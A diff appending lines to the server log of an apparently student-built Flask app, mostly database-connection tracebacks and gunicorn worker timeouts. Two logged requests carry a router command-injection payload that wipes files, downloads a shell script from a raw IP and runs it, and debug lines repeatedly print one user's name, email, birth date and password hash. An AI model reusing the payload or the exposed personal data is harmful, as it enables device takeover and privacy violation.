@@ -364,3 +364,124 @@ mysql.connector.errors.OperationalError: MySQL Connection not available
 127.0.0.1 - - [23/Feb/2024 13:22:00] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 404 -
 127.0.0.1 - - [23/Feb/2024 13:31:01] "GET /.env HTTP/1.0" 404 -
 127.0.0.1 - - [23/Feb/2024 13:31:02] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [23/Feb/2024 13:43:57] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20*;%20cd%20/tmp;%20wget%20http://107.175.3.74/tenda.sh;%20chmod%20777%20tenda.sh;%20./tenda.sh) HTTP/1.0" 404 -
+127.0.0.1 - - [23/Feb/2024 13:43:57] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20*;%20cd%20/tmp;%20wget%20http://107.175.3.74/tenda.sh;%20chmod%20777%20tenda.sh;%20./tenda.sh) HTTP/1.0" 404 -
+[2024-02-23 13:45:03,721] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 215, in login
+    cursor = db.cursor(dictionary=True)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/mysql/connector/connection.py", line 1235, in cursor
+    raise OperationalError("MySQL Connection not available")
+mysql.connector.errors.OperationalError: MySQL Connection not available
+127.0.0.1 - - [23/Feb/2024 13:45:03] "POST /login HTTP/1.0" 500 -
+127.0.0.1 - - [23/Feb/2024 13:45:04] "GET /favicon.ico HTTP/1.0" 404 -
+[2024-02-23 13:45:49,874] ERROR in app: Exception on /dashboard [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 316, in dashboard
+    user = get_user_info(user_id)
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 285, in get_user_info
+    cursor_user = db.cursor(dictionary=True)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/mysql/connector/connection.py", line 1235, in cursor
+    raise OperationalError("MySQL Connection not available")
+mysql.connector.errors.OperationalError: MySQL Connection not available
+127.0.0.1 - - [23/Feb/2024 13:45:49] "GET /dashboard HTTP/1.0" 500 -
+127.0.0.1 - - [23/Feb/2024 13:45:51] "GET /favicon.ico HTTP/1.0" 404 -
+[2024-02-23 13:47:02,630] ERROR in app: Exception on /dashboard [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 316, in dashboard
+    user = get_user_info(user_id)
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 285, in get_user_info
+    cursor_user = db.cursor(dictionary=True)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/mysql/connector/connection.py", line 1235, in cursor
+    raise OperationalError("MySQL Connection not available")
+mysql.connector.errors.OperationalError: MySQL Connection not available
+127.0.0.1 - - [23/Feb/2024 13:47:02] "GET /dashboard HTTP/1.0" 500 -
+127.0.0.1 - - [23/Feb/2024 13:47:06] "GET /login_account HTTP/1.0" 200 -
+[2024-02-23 13:47:09,801] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 215, in login
+    cursor = db.cursor(dictionary=True)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/mysql/connector/connection.py", line 1235, in cursor
+    raise OperationalError("MySQL Connection not available")
+mysql.connector.errors.OperationalError: MySQL Connection not available
+127.0.0.1 - - [23/Feb/2024 13:47:09] "POST /login HTTP/1.0" 500 -
+Database connection successful
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.247.42.255:8000
+Press CTRL+C to quit
+[2024-02-23 14:14:11 +0000] [4422] [INFO] Starting gunicorn 21.2.0
+[2024-02-23 14:14:11 +0000] [4422] [INFO] Listening at: http://0.0.0.0:8000 (4422)
+[2024-02-23 14:14:11 +0000] [4422] [INFO] Using worker: sync
+[2024-02-23 14:14:11 +0000] [4424] [INFO] Booting worker with pid: 4424
+[2024-02-23 14:14:11 +0000] [4425] [INFO] Booting worker with pid: 4425
+[2024-02-23 14:14:11 +0000] [4426] [INFO] Booting worker with pid: 4426
+[2024-02-23 14:14:11 +0000] [4427] [INFO] Booting worker with pid: 4427
+[2024-02-23 14:18:45 +0000] [4422] [CRITICAL] WORKER TIMEOUT (pid:4427)
+[2024-02-23 14:18:45 +0000] [4427] [INFO] Worker exiting (pid: 4427)
+Database connection successful
+Debug: User Info - {'id': 1, 'first_name': 'Michael', 'last_name': 'Machohi', 'username': 'sierra-95', 'email': 'michaelmachohi@gmail.com', 'dob': datetime.date(2002, 10, 3), 'password': '$2b$12$CVF7PYWCBLDVmVjA4Zcxr.udP5C9hMnBYpDw56Rc2IWToa.KZHHeC', 'events': [{'event_id': 3, 'user_id': 1, 'event_name': 'Test event', 'event_date': datetime.date(2024, 2, 23), 'event_description': 'Test upload', 'is_done': 0}, {'event_id': 1, 'user_id': 1, 'event_name': 'Alx completion', 'event_date': datetime.date(2024, 2, 29), 'event_description': 'Finish Tomorrow project', 'is_done': 0}]}
+Debug: User Info - {'id': 1, 'first_name': 'Michael', 'last_name': 'Machohi', 'username': 'sierra-95', 'email': 'michaelmachohi@gmail.com', 'dob': datetime.date(2002, 10, 3), 'password': '$2b$12$CVF7PYWCBLDVmVjA4Zcxr.udP5C9hMnBYpDw56Rc2IWToa.KZHHeC', 'events': [{'event_id': 3, 'user_id': 1, 'event_name': 'Test event', 'event_date': datetime.date(2024, 2, 23), 'event_description': 'Test upload', 'is_done': 0}, {'event_id': 1, 'user_id': 1, 'event_name': 'Alx completion', 'event_date': datetime.date(2024, 2, 29), 'event_description': 'Finish Tomorrow project', 'is_done': 0}]}
+Executing create_account_names route
+Hash method used: 2b
+[2024-02-23 14:18:45 +0000] [4422] [ERROR] Worker (pid:4427) exited with code 1
+[2024-02-23 14:18:45 +0000] [4422] [ERROR] Worker (pid:4427) exited with code 1.
+[2024-02-23 14:18:45 +0000] [4452] [INFO] Booting worker with pid: 4452
+[2024-02-23 14:19:53,031] ERROR in app: Exception on /dashboard [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 316, in dashboard
+    user = get_user_info(user_id)
+  File "/home/ubuntu/Tomorrow/web-flask/app.py", line 290, in get_user_info
+    user['events'] = get_user_events(user_id)
+TypeError: 'NoneType' object does not support item assignment
+[2024-02-23 14:32:22 +0000] [4422] [CRITICAL] WORKER TIMEOUT (pid:4452)
+[2024-02-23 14:32:22 +0000] [4452] [INFO] Worker exiting (pid: 4452)
+Database connection successful
+Debug: User Info - {'id': 1, 'first_name': 'Michael', 'last_name': 'Machohi', 'username': 'sierra-95', 'email': 'michaelmachohi@gmail.com', 'dob': datetime.date(2002, 10, 3), 'password': '$2b$12$CVF7PYWCBLDVmVjA4Zcxr.udP5C9hMnBYpDw56Rc2IWToa.KZHHeC', 'events': [{'event_id': 3, 'user_id': 1, 'event_name': 'Test event', 'event_date': datetime.date(2024, 2, 23), 'event_description': 'Test upload', 'is_done': 0}, {'event_id': 1, 'user_id': 1, 'event_name': 'Alx completion', 'event_date': datetime.date(2024, 2, 29), 'event_description': 'Finish Tomorrow project', 'is_done': 0}]}
+Debug: User Info - {'id': 1, 'first_name': 'Michael', 'last_name': 'Machohi', 'username': 'sierra-95', 'email': 'michaelmachohi@gmail.com', 'dob': datetime.date(2002, 10, 3), 'password': '$2b$12$CVF7PYWCBLDVmVjA4Zcxr.udP5C9hMnBYpDw56Rc2IWToa.KZHHeC', 'events': [{'event_id': 3, 'user_id': 1, 'event_name': 'Test event', 'event_date': datetime.date(2024, 2, 23), 'event_description': 'Test upload', 'is_done': 0}, {'event_id': 1, 'user_id': 1, 'event_name': 'Alx completion', 'event_date': datetime.date(2024, 2, 29), 'event_description': 'Finish Tomorrow project', 'is_done': 0}]}
+Executing create_account_names route
+[2024-02-23 14:32:23 +0000] [4422] [ERROR] Worker (pid:4452) exited with code 1
+[2024-02-23 14:32:23 +0000] [4422] [ERROR] Worker (pid:4452) exited with code 1.
+[2024-02-23 14:32:23 +0000] [4550] [INFO] Booting worker with pid: 4550
